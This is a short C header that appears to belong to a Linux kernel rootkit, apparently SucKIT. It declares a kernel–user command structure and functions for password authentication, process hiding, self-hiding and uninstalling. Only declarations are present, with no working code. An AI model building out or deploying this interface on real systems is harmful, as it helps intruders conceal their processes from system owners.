/*
 * $Id: aux.h, kernel <=> user pool
 */

#ifndef AUX_H
#define AUX_H

#include "sktypes.h"

#ifndef __ASSEMBLY__
typedef struct {
	ulong	cmd;
	ulong	arg;
	int	ret;
} __attribute__ ((packed)) sk_aux;

extern sk_aux	aux;
extern int	sk_io(int cmd);
extern int	sk_auth(char *pass);
extern char	*authenticated(void);
extern char	*get_khome(void);
extern int	uninstall(void);
extern int	hideme(void);
extern int	unhide_pid(int pid);
extern int	hide_pid(int pid);

#endif

#endif
